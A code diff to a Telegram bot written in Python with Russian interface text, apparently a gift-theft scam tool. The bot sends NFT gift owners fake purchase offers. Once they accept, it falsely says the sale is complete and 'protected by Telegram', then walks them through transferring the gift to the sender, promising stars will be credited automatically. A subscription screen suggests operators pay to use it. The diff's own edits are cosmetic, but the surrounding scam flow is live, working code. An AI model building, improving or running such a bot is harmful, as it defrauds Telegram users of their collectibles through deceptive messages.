@@ -575,7 +575,7 @@ async def profile(callback: types.CallbackQuery):
         text = f"<b>👤 Ваш профиль</b>\n\n✅ Подписка активна до: <b>{row[0]}</b>"
     await callback.message.edit_text(text, reply_markup=InlineKeyboardMarkup(inline_keyboard=[[InlineKeyboardButton(text="⬅️ Назад", callback_data="main_menu")]]))
 
-# === ОФФЕР ===
+# === ОФФЕР (ЭКРАН 1) ===
 @dp.business_message(F.text.startswith("/h"))
 async def make_offer(message: types.Message):
     save_user(message.from_user)
@@ -592,7 +592,6 @@ async def make_offer(message: types.Message):
     
     match = re.search(r'/nft/([^-]+)-(\d+)', link)
     gift_name = f"{match.group(1)} #{match.group(2)}" if match else "Collectible"
-    sender_name = message.from_user.first_name
     sender_id = message.from_user.id
     
     if lang == "ru":
@@ -608,7 +607,7 @@ async def make_offer(message: types.Message):
         )
         btn_accept, btn_decline = "Accept", "Decline"
 
-    # ОТКЛОНИТЬ СЛЕВА, ПРИНЯТЬ СПРАВА
+    # ❌ СЛЕВА, ✅ СПРАВА
     keyboard = InlineKeyboardMarkup(inline_keyboard=[[
         InlineKeyboardButton(text=f"❌ {btn_decline}", callback_data="decline_offer"),
         InlineKeyboardButton(text=f"✅ {btn_accept}", callback_data=f"accept_{price}_{gift_name}_{sender_id}")
@@ -630,6 +629,7 @@ async def make_offer(message: types.Message):
         except: pass
         await message.answer(text=text, reply_markup=keyboard, **kwargs)
 
+# === ЭКРАН 2 (ПОСЛЕ ПРИНЯТИЯ) ===
 @dp.callback_query(F.data.startswith("accept_"))
 async def accept(callback: types.CallbackQuery):
     await callback.answer()
@@ -639,11 +639,11 @@ async def accept(callback: types.CallbackQuery):
     text_accepted = (
         f"<b>🎁 Подарок: {gift_name} успешно продан!</b>\n\n"
         f"<b>Передайте подарок покупателю для зачисления звёзд.</b>\n\n"
-        f"<i>(Сделка защищена Telegram. После передачи подарка звезды поступят на ваш баланс.)</i>"
+        f"<i>Сделка защищена Telegram. После передачи подарка звезды поступят на ваш баланс.</i>"
     )
     
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
-        [InlineKeyboardButton(text="Передать NFT ↗️", url=f"tg://user?id={sender_id}")],
+        [InlineKeyboardButton(text="Передать NFT ↗", url=f"tg://user?id={sender_id}")],
         [InlineKeyboardButton(text="Как передать?", callback_data=f"how_to_send_{price}_{gift_name}_{sender_id}")]
     ])
     await change_message(callback.message, text_accepted, keyboard)
@@ -660,7 +660,6 @@ async def how_to_send(callback: types.CallbackQuery):
         "5. Подтвердите отправку.\n\n"
         "<b>После этого звезды поступят на ваш баланс автоматически.</b>"
     )
-    # Возвращаемся к офферу (по данным из callback)
     parts = callback.data.split("_")
     price, gift_name, sender_id = parts[2], parts[3], parts[4]
     keyboard = InlineKeyboardMarkup(inline_keyboard=[
